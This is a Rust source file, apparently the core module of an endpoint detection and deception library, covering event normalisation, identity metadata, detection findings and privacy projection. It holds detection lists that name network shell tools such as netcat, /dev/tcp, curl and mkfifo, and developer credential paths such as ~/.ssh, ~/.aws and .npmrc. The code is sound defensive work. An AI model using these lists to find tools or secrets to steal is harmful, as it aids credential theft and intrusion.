//! Endpoint detection, deception, and causal graph primitives.
//!
//! This module is intentionally pure and deterministic. Platform sensors feed
//! observations into it; the logic here classifies supply-chain runtime risk,
//! models safe honey artifacts, and records local causal evidence without
//! depending on a specific EDR transport.

#![allow(dead_code, unused_imports)]

pub mod action;
pub mod actor;
pub mod causal;
pub mod deception;
pub mod detection;
pub mod event;
pub mod flight_recorder;
pub mod ids;
pub mod privacy;
pub mod process;
pub mod receipt;
pub mod response;
pub mod sensor_state;
pub mod simulation;

pub use action::*;
pub use actor::*;
pub use causal::*;
pub use deception::*;
pub use detection::*;
pub use event::*;
pub use flight_recorder::compaction::{
    EndpointFlightRecorderCompactionRecord, EndpointFlightRecorderCompactionReport,
};
pub use flight_recorder::index::{
    EndpointFlightRecorderGraphEdgeIndexEntry, EndpointFlightRecorderGraphNodeIndexEntry,
    EndpointFlightRecorderHistoryIndexEntry,
};
pub use flight_recorder::*;
pub use ids::*;
pub use privacy::*;
pub use process::*;
pub use receipt::*;
pub use response::*;
pub use sensor_state::*;
pub use simulation::*;

use std::collections::{BTreeMap, BTreeSet, VecDeque};
use std::fs::{self, OpenOptions};
use std::io::{BufRead as _, BufReader, ErrorKind, Read as _, Seek as _, SeekFrom, Write as _};
use std::path::{Component, Path, PathBuf};

use anyhow::{anyhow, Context, Result};
use chrono::{DateTime, Utc};
use hush_core::{
    canonicalize_json, sha256, Hash, Provenance, Receipt, SignedReceipt, Signer, Verdict,
};
use serde::{Deserialize, Serialize};

use crate::event::{
    CommandEventData, CustomEventData, FileEventData, NetworkEventData, PolicyEvent,
    PolicyEventData, PolicyEventType, SecretEventData, ToolEventData,
};

pub(crate) const FNV_OFFSET: u64 = 0xcbf2_9ce4_8422_2325;
pub(crate) const FNV_PRIME: u64 = 0x0000_0100_0000_01b3;
pub(crate) const ENDPOINT_FLIGHT_RECORDER_HISTORY_INDEX_SCHEMA_VERSION: u8 = 10;
pub(crate) const ENDPOINT_FLIGHT_RECORDER_GRAPH_INDEX_SCHEMA_VERSION: u8 = 1;
pub(crate) const ENDPOINT_FLIGHT_RECORDER_GRAPH_EDGE_INDEX_SCHEMA_VERSION: u8 = 1;

fn canonical_graph_content_hash(graph: &CausalGraph) -> Option<String> {
    serde_json::to_value(graph)
        .ok()
        .and_then(|value| canonicalize_json(&value).ok())
        .map(|canonical_graph| sha256(canonical_graph.as_bytes()).to_hex_prefixed())
}

pub(crate) fn endpoint_sensor_state_content_hash(sensor_state: &EndpointSensorState) -> String {
    let value = serde_json::to_value(sensor_state).unwrap_or(serde_json::Value::Null);
    let canonical = canonicalize_json(&value).unwrap_or_else(|_| "null".to_string());
    sha256(canonical.as_bytes()).to_hex_prefixed()
}

pub(crate) fn endpoint_observation_content_hash(observation: &EndpointObservation) -> String {
    let value = serde_json::to_value(observation).unwrap_or(serde_json::Value::Null);
    let canonical = canonicalize_json(&value).unwrap_or_else(|_| "null".to_string());
    sha256(canonical.as_bytes()).to_hex_prefixed()
}

pub(crate) fn endpoint_decision_actor_content_hash(actor: &EndpointDecisionActor) -> String {
    let value = serde_json::to_value(actor).unwrap_or(serde_json::Value::Null);
    let canonical = canonicalize_json(&value).unwrap_or_else(|_| "null".to_string());
    sha256(canonical.as_bytes()).to_hex_prefixed()
}

pub(crate) fn observation_age_seconds(
    observation: &EndpointObservation,
    now: DateTime<Utc>,
) -> u64 {
    now.signed_duration_since(observation.timestamp)
        .num_seconds()
        .max(0) as u64
}

fn endpoint_event_from_policy_event(event: &PolicyEvent) -> EndpointEvent {
    match (&event.event_type, &event.data) {
        (
            PolicyEventType::FileRead | PolicyEventType::FileWrite,
            PolicyEventData::File(FileEventData {
                path,
                operation,
                content,
                ..
            }),
        ) => EndpointEvent::FileAccess {
            operation: FileOperation::from_policy_operation(
                operation.as_deref(),
                &event.event_type,
            ),
            path: path.clone(),
            source_url: None,
            content_preview: content.clone(),
        },
        (
            PolicyEventType::NetworkEgress,
            PolicyEventData::Network(NetworkEventData {
                host,
                port,
                protocol,
                url,
            }),
        ) => EndpointEvent::NetworkFlow {
            host: host.clone(),
            port: *port,
            protocol: protocol.clone(),
            url: url.clone(),
        },
        (PolicyEventType::CommandExec, PolicyEventData::Command(command)) => {
            EndpointEvent::ProcessExec {
                image: command.command.clone(),
                args: command.args.clone(),
                env: BTreeMap::new(),
            }
        }
        (PolicyEventType::ToolCall, PolicyEventData::Tool(tool)) => EndpointEvent::ToolCall {
            tool_name: tool.tool_name.clone(),
            parameters: tool.parameters.clone(),
        },
        (PolicyEventType::SecretAccess, PolicyEventData::Secret(secret)) => {
            EndpointEvent::CredentialAccess {
                kind: credential_kind_from_secret(&secret.scope, &secret.secret_name),
                path: None,
                name: Some(secret.secret_name.clone()),
            }
        }
        (PolicyEventType::Custom, PolicyEventData::Custom(custom)) => {
            endpoint_event_from_custom_policy_event(custom).unwrap_or_else(|| {
                EndpointEvent::Other {
                    category: custom.custom_type.clone(),
                    fields: custom.extra.clone().into_iter().collect(),
                }
            })
        }
        _ => EndpointEvent::Other {
            category: event.event_type.as_str().to_string(),
            fields: BTreeMap::new(),
        },
    }
}

fn endpoint_event_from_custom_policy_event(custom: &CustomEventData) -> Option<EndpointEvent> {
    custom
        .extra
        .get("endpointEvent")
        .and_then(|value| serde_json::from_value(value.clone()).ok())
}

fn metadata_as_btree(
    metadata: Option<&serde_json::Value>,
    context: Option<&serde_json::Value>,
) -> BTreeMap<String, serde_json::Value> {
    let mut out = metadata
        .and_then(serde_json::Value::as_object)
        .map(|obj| {
            obj.iter()
                .map(|(key, value)| (key.clone(), value.clone()))
                .collect::<BTreeMap<_, _>>()
        })
        .unwrap_or_default();

    promote_policy_event_context_identity(&mut out, context);
    out
}

fn promote_policy_event_context_identity(
    metadata: &mut BTreeMap<String, serde_json::Value>,
    context: Option<&serde_json::Value>,
) {
    let Some(context) = context else {
        return;
    };
    promote_context_string(
        metadata,
        context,
        "hostId",
        &[
            "hostId",
            "host_id",
            "endpointHostId",
            "endpoint_host_id",
            "endpointId",
            "endpoint_id",
        ],
    );
    promote_context_string(
        metadata,
        context,
        "userId",
        &[
            "userId",
            "user_id",
            "principal",
            "principalId",
            "principal_id",
        ],
    );
    promote_context_string(metadata, context, "sessionId", &["sessionId", "session_id"]);
    promote_context_string(
        metadata,
        context,
        "agentId",
        &[
            "agentId",
            "agent_id",
            "endpointAgentId",
            "endpoint_agent_id",
            "runtimeAgentId",
            "runtime_agent_id",
        ],
    );
    promote_context_string(
        metadata,
        context,
        "workloadId",
        &[
            "workloadId",
            "workload_id",
            "workloadIdentity",
            "workload_identity",
            "spiffeId",
            "spiffe_id",
        ],
    );
    promote_context_string(
        metadata,
        context,
        "approvalId",
        &[
            "approvalId",
            "approval_id",
            "approvalRequestId",
            "approval_request_id",
        ],
    );
    promote_context_string(
        metadata,
        context,
        "posture",
        &["posture", "postureState", "posture_state"],
    );
    promote_context_scalar(
        metadata,
        context,
        "policyEpoch",
        &["policyEpoch", "policy_epoch", "policyBundleEpoch"],
    );
    promote_context_string(
        metadata,
        context,
        "policyVersion",
        &["policyVersion", "policy_version"],
    );
    promote_context_string(
        metadata,
        context,
        "policyHash",
        &["policyHash", "policy_hash"],
    );

    if !metadata.contains_key("userId") {
        for path in [
            &["identity", "id"][..],
            &["session", "identity", "id"][..],
            &["metadata", "identity", "id"][..],
        ] {
            if let Some(value) = string_at_path(context, path) {
                metadata.insert("userId".to_string(), serde_json::Value::String(value));
                break;
            }
        }
    }
    if !metadata.contains_key("sessionId") {
        for path in [
            &["session", "sessionId"][..],
            &["session", "session_id"][..],
            &["metadata", "sessionId"][..],
            &["metadata", "session_id"][..],
        ] {
            if let Some(value) = string_at_path(context, path) {
                metadata.insert("sessionId".to_string(), serde_json::Value::String(value));
                break;
            }
        }
    }
}

fn promote_context_string(
    metadata: &mut BTreeMap<String, serde_json::Value>,
    context: &serde_json::Value,
    canonical_key: &str,
    aliases: &[&str],
) {
    if metadata_contains_any_key(metadata, canonical_key, aliases) {
        return;
    }
    if let Some(value) = context_string_value(context, aliases) {
        metadata.insert(canonical_key.to_string(), serde_json::Value::String(value));
    }
}

fn promote_context_scalar(
    metadata: &mut BTreeMap<String, serde_json::Value>,
    context: &serde_json::Value,
    canonical_key: &str,
    aliases: &[&str],
) {
    if metadata_contains_any_key(metadata, canonical_key, aliases) {
        return;
    }
    if let Some(value) = context_scalar_value(context, aliases) {
        metadata.insert(canonical_key.to_string(), value);
    }
}

fn metadata_contains_any_key(
    metadata: &BTreeMap<String, serde_json::Value>,
    canonical_key: &str,
    aliases: &[&str],
) -> bool {
    metadata.contains_key(canonical_key)
        || aliases.iter().any(|alias| metadata.contains_key(*alias))
}

fn context_string_value(context: &serde_json::Value, aliases: &[&str]) -> Option<String> {
    aliases.iter().find_map(|alias| {
        string_at_path(context, &[*alias])
            .or_else(|| string_at_path(context, &["metadata", *alias]))
    })
}

fn context_scalar_value(
    context: &serde_json::Value,
    aliases: &[&str],
) -> Option<serde_json::Value> {
    aliases.iter().find_map(|alias| {
        scalar_at_path(context, &[*alias])
            .or_else(|| scalar_at_path(context, &["metadata", *alias]))
    })
}

fn string_at_path(value: &serde_json::Value, path: &[&str]) -> Option<String> {
    path.iter()
        .try_fold(value, |current, key| current.get(*key))
        .and_then(serde_json::Value::as_str)
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(ToString::to_string)
}

fn scalar_at_path(value: &serde_json::Value, path: &[&str]) -> Option<serde_json::Value> {
    let value = path
        .iter()
        .try_fold(value, |current, key| current.get(*key))?;
    match value {
        serde_json::Value::String(text) if !text.trim().is_empty() => {
            Some(serde_json::Value::String(text.trim().to_string()))
        }
        serde_json::Value::Number(_) | serde_json::Value::Bool(_) => Some(value.clone()),
        _ => None,
    }
}

fn process_from_metadata(metadata: &BTreeMap<String, serde_json::Value>) -> EndpointProcess {
    let process_obj = metadata
        .get("process")
        .and_then(serde_json::Value::as_object);
    EndpointProcess {
        pid: u32_field(metadata, process_obj, &["pid", "processId", "process_id"]),
        ppid: u32_field(metadata, process_obj, &["ppid", "parentPid", "parent_pid"]),
        process_guid: string_field_nested(
            metadata,
            process_obj,
            &["processGuid", "process_guid", "entityId", "entity_id"],
        ),
        parent_process_guid: string_field_nested(
            metadata,
            process_obj,
            &["parentProcessGuid", "parent_process_guid", "parentEntityId"],
        ),
        image: string_field_nested(metadata, process_obj, &["image", "processImage", "path"]),
        command_line: string_field_nested(
            metadata,
            process_obj,
            &["commandLine", "command_line", "cmdline"],
        ),
        cwd: string_field_nested(metadata, process_obj, &["cwd", "workingDirectory"]),
        signing: metadata
            .get("signing")
            .or_else(|| process_obj.and_then(|obj| obj.get("signing")))
            .and_then(|value| serde_json::from_value(value.clone()).ok())
            .unwrap_or_default(),
    }
}

fn u32_field(
    metadata: &BTreeMap<String, serde_json::Value>,
    nested: Option<&serde_json::Map<String, serde_json::Value>>,
    keys: &[&str],
) -> Option<u32> {
    for key in keys {
        let value = nested
            .and_then(|obj| obj.get(*key))
            .or_else(|| metadata.get(*key));
        match value {
            Some(serde_json::Value::Number(number)) => {
                if let Some(value) = number.as_u64().and_then(|value| u32::try_from(value).ok()) {
                    return Some(value);
                }
            }
            Some(serde_json::Value::String(value)) => {
                if let Ok(parsed) = value.parse::<u32>() {
                    return Some(parsed);
                }
            }
            _ => {}
        }
    }
    None
}

fn string_field(metadata: &BTreeMap<String, serde_json::Value>, keys: &[&str]) -> Option<String> {
    keys.iter().find_map(|key| {
        metadata
            .get(*key)
            .and_then(serde_json::Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToString::to_string)
    })
}

fn normalized_identity_value(value: Option<&str>) -> Option<String> {
    value
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(ToString::to_string)
}

fn agent_id_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "agentId",
            "agent_id",
            "endpointAgentId",
            "endpoint_agent_id",
            "runtimeAgentId",
            "runtime_agent_id",
        ],
    )
}

fn workload_id_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "workloadId",
            "workload_id",
            "workloadIdentity",
            "workload_identity",
            "spiffeId",
            "spiffe_id",
        ],
    )
}

fn approval_id_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "approvalId",
            "approval_id",
            "approvalRequestId",
            "approval_request_id",
        ],
    )
}

pub(crate) fn tool_name_field(observation: &EndpointObservation) -> Option<String> {
    match &observation.event {
        EndpointEvent::ToolCall { tool_name, .. } => normalized_identity_value(Some(tool_name))
            .or_else(|| tool_name_metadata_field(&observation.metadata)),
        _ => tool_name_metadata_field(&observation.metadata),
    }
}

fn tool_name_metadata_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "toolName",
            "tool_name",
            "mcpToolName",
            "mcp_tool_name",
            "toolInvocationName",
            "tool_invocation_name",
        ],
    )
}

fn tool_call_id_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "toolCallId",
            "tool_call_id",
            "toolInvocationId",
            "tool_invocation_id",
            "toolUseId",
            "tool_use_id",
        ],
    )
}

pub(crate) fn credential_kind_field(observation: &EndpointObservation) -> Option<String> {
    match &observation.event {
        EndpointEvent::CredentialAccess { kind, .. } => {
            normalized_identity_value(Some(kind.as_str()))
                .or_else(|| credential_kind_metadata_field(&observation.metadata))
        }
        _ => credential_kind_metadata_field(&observation.metadata),
    }
}

fn credential_kind_metadata_field(
    metadata: &BTreeMap<String, serde_json::Value>,
) -> Option<String> {
    string_field(
        metadata,
        &[
            "credentialKind",
            "credential_kind",
            "secretKind",
            "secret_kind",
            "credentialScope",
            "credential_scope",
        ],
    )
}

pub(crate) fn event_target_field(observation: &EndpointObservation) -> Option<String> {
    let event_target = match &observation.event {
        EndpointEvent::ProcessExec { image, .. } => normalized_identity_value(Some(image)),
        EndpointEvent::FileAccess { path, .. }
        | EndpointEvent::DylibLoad { path, .. }
        | EndpointEvent::LaunchPersistence { path, .. } => normalized_identity_value(Some(path)),
        EndpointEvent::NetworkFlow { host, .. } => normalized_identity_value(Some(host)),
        EndpointEvent::DnsLookup { query, .. } => normalized_identity_value(Some(query)),
        EndpointEvent::PackageScript {
            manager, package, ..
        } => normalized_identity_value(package.as_deref().or(Some(manager.as_str()))),
        EndpointEvent::BrowserExtensionInstall {
            extension_id, path, ..
        } => normalized_identity_value(extension_id.as_deref().or(Some(path))),
        EndpointEvent::BrowserDownload {
            source_url, path, ..
        } => normalized_identity_value(source_url.as_deref().or(Some(path))),
        EndpointEvent::CredentialAccess { kind, path, name } => {
            normalized_identity_value(name.as_deref().or(path.as_deref()).or(Some(kind.as_str())))
        }
        EndpointEvent::ToolCall { tool_name, .. } => normalized_identity_value(Some(tool_name)),
        EndpointEvent::PolicyDecision { target, .. } => {
            normalized_identity_value(target.as_deref())
        }
        EndpointEvent::Other { category, .. } => normalized_identity_value(Some(category)),
    };
    event_target.or_else(|| event_target_metadata_field(&observation.metadata))
}

fn event_target_metadata_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "eventTarget",
            "event_target",
            "target",
            "resourceTarget",
            "resource_target",
        ],
    )
}

pub(crate) fn event_target_hash_field(event_target: Option<&str>) -> Option<String> {
    normalized_identity_value(event_target)
        .map(|event_target| sha256(event_target.as_bytes()).to_hex_prefixed())
}

pub(crate) fn process_image_hash_field(observation: &EndpointObservation) -> Option<String> {
    normalized_identity_value(observation.process.image.as_deref())
        .map(|image| sha256(image.as_bytes()).to_hex_prefixed())
}

pub(crate) fn process_command_line_hash_field(observation: &EndpointObservation) -> Option<String> {
    normalized_identity_value(observation.process.command_line.as_deref())
        .map(|command_line| sha256(command_line.as_bytes()).to_hex_prefixed())
}

fn string_field_nested(
    metadata: &BTreeMap<String, serde_json::Value>,
    nested: Option<&serde_json::Map<String, serde_json::Value>>,
    keys: &[&str],
) -> Option<String> {
    keys.iter().find_map(|key| {
        nested
            .and_then(|obj| obj.get(*key))
            .or_else(|| metadata.get(*key))
            .and_then(serde_json::Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToString::to_string)
    })
}

pub(crate) struct FindingRule<'a> {
    pub(crate) rule_id: &'a str,
    pub(crate) title: &'a str,
    pub(crate) severity: DetectionSeverity,
    pub(crate) confidence: f32,
    pub(crate) description: &'a str,
    pub(crate) mitre_attack: Vec<&'a str>,
    pub(crate) tags: Vec<&'a str>,
    pub(crate) remediation: &'a str,
}

fn finding(
    observation: &EndpointObservation,
    mut evidence: Vec<DetectionEvidence>,
    rule: FindingRule<'_>,
) -> DetectionFinding {
    append_observation_identity_evidence(observation, &mut evidence);
    DetectionFinding {
        finding_id: stable_id(
            "finding",
            [rule.rule_id, observation.observation_id.as_str()],
        ),
        rule_id: rule.rule_id.to_string(),
        title: rule.title.to_string(),
        severity: rule.severity,
        confidence: rule.confidence,
        description: rule.description.to_string(),
        observation_id: observation.observation_id.clone(),
        timestamp: observation.timestamp,
        evidence,
        mitre_attack: rule
            .mitre_attack
            .into_iter()
            .map(ToString::to_string)
            .collect(),
        tags: rule.tags.into_iter().map(ToString::to_string).collect(),
        remediation: rule.remediation.to_string(),
    }
}

fn append_observation_identity_evidence(
    observation: &EndpointObservation,
    evidence: &mut Vec<DetectionEvidence>,
) {
    push_optional_identity_evidence(evidence, "hostId", observation.host_id.clone());
    push_optional_identity_evidence(evidence, "userId", observation.user_id.clone());
    push_optional_identity_evidence(evidence, "sessionId", observation.session_id.clone());
    push_optional_identity_evidence(
        evidence,
        "processGuid",
        normalized_identity_value(observation.process.process_guid.as_deref()),
    );
    push_optional_identity_evidence(
        evidence,
        "parentProcessGuid",
        normalized_identity_value(observation.process.parent_process_guid.as_deref()),
    );
    push_optional_identity_evidence(evidence, "agentId", agent_id_field(&observation.metadata));
    push_optional_identity_evidence(
        evidence,
        "workloadId",
        workload_id_field(&observation.metadata),
    );
    push_optional_identity_evidence(
        evidence,
        "approvalId",
        approval_id_field(&observation.metadata),
    );
    push_optional_identity_evidence(evidence, "toolName", tool_name_field(observation));
    push_optional_identity_evidence(
        evidence,
        "toolCallId",
        tool_call_id_field(&observation.metadata),
    );
}

fn push_optional_identity_evidence(
    evidence: &mut Vec<DetectionEvidence>,
    key: &'static str,
    value: Option<String>,
) {
    let Some(value) = value else {
        return;
    };
    if evidence.iter().any(|item| item.key == key) {
        return;
    }
    evidence.push(ev(key, value));
}

fn ev(key: impl Into<String>, value: impl Into<String>) -> DetectionEvidence {
    DetectionEvidence {
        key: key.into(),
        value: value.into(),
    }
}

fn opt_ev(key: impl Into<String>, value: Option<&str>) -> Option<DetectionEvidence> {
    value.map(|value| ev(key, value))
}

fn is_install_phase(phase: &str) -> bool {
    let phase = phase.to_ascii_lowercase();
    [
        "preinstall",
        "install",
        "postinstall",
        "prepare",
        "build",
        "build.rs",
        "setup.py",
    ]
    .iter()
    .any(|needle| phase.contains(needle))
}

fn suspicious_script_reason(script: &str) -> Option<&'static str> {
    let script = script.to_ascii_lowercase();
    [
        ("curl ", "downloads remote payloads with curl"),
        ("wget ", "downloads remote payloads with wget"),
        ("bash -c", "executes an inline shell"),
        ("sh -c", "executes an inline shell"),
        ("base64", "decodes or hides payload material"),
        ("openssl enc", "decrypts embedded payload material"),
        ("osascript", "uses AppleScript automation"),
        ("launchctl", "modifies launch services"),
        ("crontab", "modifies cron persistence"),
        ("chmod +x", "makes a downloaded file executable"),
        ("mkfifo", "creates shell transport primitives"),
        ("/dev/tcp", "uses shell TCP redirection"),
        ("nc ", "uses netcat"),
        ("netcat", "uses netcat"),
        ("eval ", "evaluates generated code"),
        ("python -c", "executes inline Python"),
        ("ruby -e", "executes inline Ruby"),
        ("perl -e", "executes inline Perl"),
    ]
    .into_iter()
    .find_map(|(needle, reason)| script.contains(needle).then_some(reason))
}

fn path_is_user_writable_or_download(path: &str) -> bool {
    let path = normalize_path_string(path);
    path.starts_with("/tmp/")
        || path.starts_with("/private/tmp/")
        || path.starts_with("/var/folders/")
        || path.contains("/Downloads/")
        || path.contains("/Library/Caches/")
        || path.contains("/.cache/")
        || path.contains("/node_modules/.bin/")
        || path.contains("/target/debug/")
        || path.contains("/target/release/")
}

fn path_is_launch_persistence(path: &str) -> bool {
    let path = normalize_path_string(path);
    path.contains("/Library/LaunchAgents/")
        || path.contains("/Library/LaunchDaemons/")
        || path.contains("/System/Library/LaunchAgents/")
        || path.contains("/System/Library/LaunchDaemons/")
}

fn path_looks_like_browser_extension(path: &str) -> bool {
    let path = normalize_path_string(path);
    path.contains("/Extensions/") || path.contains("/Browser Extensions/")
}

fn path_looks_like_developer_secret(path: &str) -> bool {
    let path = normalize_path_string(path).to_ascii_lowercase();
    [
        "/.ssh/",
        "/.aws/",
        "/.config/gcloud/",
        "/.config/gh/hosts.yml",
        "/.config/gh/config.yml",
        "/.config/glab-cli/hosts.yml",
        "/.config/glab-cli/config.yml",
        "/.config/hub",
        "/.config/git-credential/",
        "/.config/sops/age/keys.txt",
        "/.age/key.txt",
        "/.gnupg/private-keys-v1.d/",
        "/.gnupg/secring.gpg",
        "/.kube/config",
        "/.terraform.d/credentials.tfrc.json",
        "/.terraformrc",
        "/.config/pulumi/credentials.json",
        "/.pulumi/credentials.json",
        "/.azure/",
        "/.npmrc",
        "/.pypirc",
        "/.yarnrc.yml",
        "/.pnpmrc",
        "/.config/pip/pip.conf",
        "/.pip/pip.conf",
        "/pip/pip.ini",
        "/.config/pypoetry/auth.toml",
        "/library/application support/pypoetry/auth.toml",
        "/.m2/settings.xml",
        "/.gradle/gradle.properties",
        "/.nuget/nuget/nuget.config",
        "/.cargo/credentials",
        "/.docker/config.json",
        "id_rsa",
        "id_ed25519",
        "cookies",
        "local state",
    ]
    .iter()
    .any(|needle| path.contains(needle))
}

fn credential_kind_is_developer_secret(kind: &CredentialKind) -> bool {
    matches!(
        kind,
        CredentialKind::SshKey
            | CredentialKind::ApiToken
            | CredentialKind::CloudCredential
            | CredentialKind::PackageRegistryToken
            | CredentialKind::SigningKey
    )
}

fn credential_kind_from_secret(scope: &str, secret_name: &str) -> CredentialKind {
    let scope = scope.trim();
    let combined = format!("{scope} {secret_name}").to_ascii_lowercase();
    if contains_any(&combined, &["ssh", "private_key", "id_rsa", "id_ed25519"]) {
        CredentialKind::SshKey
    } else if contains_any(
        &combined,
        &["npm", "pypi", "cargo", "registry", "package_token"],
    ) {
        CredentialKind::PackageRegistryToken
    } else if contains_any(&combined, &["aws", "gcp", "gcloud", "azure", "cloud"]) {
        CredentialKind::CloudCredential
    } else if contains_any(&combined, &["browser", "cookie"]) {
        CredentialKind::BrowserCookie
    } else if contains_any(
        &combined,
        &[
            "signing",
            "codesign",
            "notary",
            "certificate",
            "cert",
            "sops",
            "age",
            "gnupg",
            "gpg",
        ],
    ) {
        CredentialKind::SigningKey
    } else if contains_any(
        &combined,
        &[
            "api",
            "token",
            "secret",
            "key",
            "pat",
            "github_token",
            "gitlab_token",
            "ci",
        ],
    ) {
        CredentialKind::ApiToken
    } else {
        CredentialKind::Other(scope.to_string())
    }
}

fn contains_any(value: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| value.contains(needle))
}

fn project_observation_privacy(
    observation: &EndpointObservation,
    privacy_mode: &EndpointTelemetryPrivacyMode,
) -> EndpointTelemetryObservationProjection {
    let mut projections = Vec::new();
    push_optional_hash(
        &mut projections,
        "hostId",
        observation.host_id.as_deref(),
        privacy_mode,
        "host identifiers are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "userId",
        observation.user_id.as_deref(),
        privacy_mode,
        "user identifiers are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "sessionId",
        observation.session_id.as_deref(),
        privacy_mode,
        "session identifiers are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "process.image",
        observation.process.image.as_deref(),
        privacy_mode,
        "process paths may include local usernames or project names",
    );
    push_optional_local(
        &mut projections,
        "process.commandLine",
        observation.process.command_line.as_deref(),
        privacy_mode,
        "command lines may contain secrets, prompts, paths, or customer data",
    );
    push_optional_hash(
        &mut projections,
        "process.cwd",
        observation.process.cwd.as_deref(),
        privacy_mode,
        "working directories may include local usernames or repository names",
    );
    push_optional_hash(
        &mut projections,
        "process.processGuid",
        observation.process.process_guid.as_deref(),
        privacy_mode,
        "process identifiers are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "process.parentProcessGuid",
        observation.process.parent_process_guid.as_deref(),
        privacy_mode,
        "parent process identifiers are correlated by hash by default",
    );
    push_optional_metadata(
        &mut projections,
        "process.pid",
        observation.process.pid.map(|value| value.to_string()),
        privacy_mode,
        "numeric process identifiers are low-content local features",
    );
    push_optional_metadata(
        &mut projections,
        "process.ppid",
        observation.process.ppid.map(|value| value.to_string()),
        privacy_mode,
        "numeric parent process identifiers are low-content local features",
    );
    push_metadata(
        &mut projections,
        "process.signing.trust",
        format!("{:?}", observation.process.signing.trust),
        privacy_mode,
        "signature trust is a normalized posture feature",
    );
    push_optional_metadata(
        &mut projections,
        "process.signing.notarized",
        observation
            .process
            .signing
            .notarized
            .map(|value| value.to_string()),
        privacy_mode,
        "notarization state is a normalized posture feature",
    );
    push_optional_hash(
        &mut projections,
        "process.signing.cdhash",
        observation.process.signing.cdhash.as_deref(),
        privacy_mode,
        "code directory hashes are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "process.signing.expectedCdhash",
        observation.process.signing.expected_cdhash.as_deref(),
        privacy_mode,
        "expected code directory hashes are correlated by hash by default",
    );

    project_event_privacy(&observation.event, privacy_mode, &mut projections);
    if !observation.metadata.is_empty() {
        push_local(
            &mut projections,
            "metadata",
            serde_json::to_string(&observation.metadata).unwrap_or_default(),
            privacy_mode,
            "arbitrary observation metadata may contain raw artifact or tenant data",
        );
    }

    let raw_suppressed_count = projections
        .iter()
        .filter(|projection| {
            projection.raw_value.is_none()
                && projection.value_hash.is_some()
                && matches!(
                    projection.redaction_class,
                    EndpointEvidenceRedactionClass::HashOnly
                        | EndpointEvidenceRedactionClass::LocalOnly
                        | EndpointEvidenceRedactionClass::Redacted
                )
        })
        .count();
    let local_only_count = projections
        .iter()
        .filter(|projection| {
            projection.redaction_class == EndpointEvidenceRedactionClass::LocalOnly
        })
        .count();

    EndpointTelemetryObservationProjection {
        observation_id: observation.observation_id.clone(),
        event_kind: observation.event.kind_name().to_string(),
        field_count: projections.len(),
        raw_suppressed_count,
        local_only_count,
        projections,
    }
}

fn project_event_privacy(
    event: &EndpointEvent,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
) {
    match event {
        EndpointEvent::ProcessExec { image, args, env } => {
            push_hash(
                projections,
                "event.processExec.image",
                image,
                privacy_mode,
                "process paths may include local usernames or project names",
            );
            push_local(
                projections,
                "event.processExec.args",
                args.join(" "),
                privacy_mode,
                "process arguments may contain secrets, prompts, paths, or customer data",
            );
            if !env.is_empty() {
                push_local(
                    projections,
                    "event.processExec.env",
                    serde_json::to_string(env).unwrap_or_default(),
                    privacy_mode,
                    "environment variables may contain credentials",
                );
            }
        }
        EndpointEvent::FileAccess {
            operation,
            path,
            source_url,
            content_preview,
        } => {
            push_metadata(
                projections,
                "event.fileAccess.operation",
                format!("{operation:?}"),
                privacy_mode,
                "file operation is a normalized event feature",
            );
            push_hash(
                projections,
                "event.fileAccess.path",
                path,
                privacy_mode,
                "file paths may include local usernames, project names, or document names",
            );
            push_optional_hash(
                projections,
                "event.fileAccess.sourceUrl",
                source_url.as_deref(),
                privacy_mode,
                "source URLs may contain internal hosts or query strings",
            );
            push_optional_local(
                projections,
                "event.fileAccess.contentPreview",
                content_preview.as_deref(),
                privacy_mode,
                "file content previews are raw artifacts",
            );
        }
        EndpointEvent::NetworkFlow {
            host,
            port,
            protocol,
            url,
        } => {
            push_hash(
                projections,
                "event.networkFlow.host",
                host,
                privacy_mode,
                "network hosts may reveal internal infrastructure",
            );
            push_metadata(
                projections,
                "event.networkFlow.port",
                port.to_string(),
                privacy_mode,
                "network port is a normalized event feature",
            );
            push_optional_metadata(
                projections,
                "event.networkFlow.protocol",
                protocol.clone(),
                privacy_mode,
                "network protocol is a normalized event feature",
            );
            push_optional_hash(
                projections,
                "event.networkFlow.url",
                url.as_deref(),
                privacy_mode,
                "URLs may contain paths, query strings, or tenant data",
            );
        }
        EndpointEvent::DnsLookup {
            query,
            record_type,
            answers,
            resolver,
            status,
        } => {
            push_hash(
                projections,
                "event.dnsLookup.query",
                query,
                privacy_mode,
                "DNS queries may reveal internal infrastructure or customer domains",
            );
            push_optional_metadata(
                projections,
                "event.dnsLookup.recordType",
                record_type.clone(),
                privacy_mode,
                "DNS record type is a normalized event feature",
            );
            if !answers.is_empty() {
                push_hash(
                    projections,
                    "event.dnsLookup.answers",
                    answers.join(","),
                    privacy_mode,
                    "DNS answers may include internal infrastructure",
                );
            }
            push_optional_hash(
                projections,
                "event.dnsLookup.resolver",
                resolver.as_deref(),
                privacy_mode,
                "DNS resolvers may identify internal networks",
            );
            push_optional_metadata(
                projections,
                "event.dnsLookup.status",
                status.clone(),
                privacy_mode,
                "DNS status is a normalized event feature",
            );
        }
        EndpointEvent::PackageScript {
            manager,
            package,
            phase,
            script,
            working_directory,
        } => {
            push_metadata(
                projections,
                "event.packageScript.manager",
                manager.as_str(),
                privacy_mode,
                "package manager is a normalized event feature",
            );
            push_metadata(
                projections,
                "event.packageScript.phase",
                phase,
                privacy_mode,
                "package lifecycle phase is a normalized event feature",
            );
            push_optional_hash(
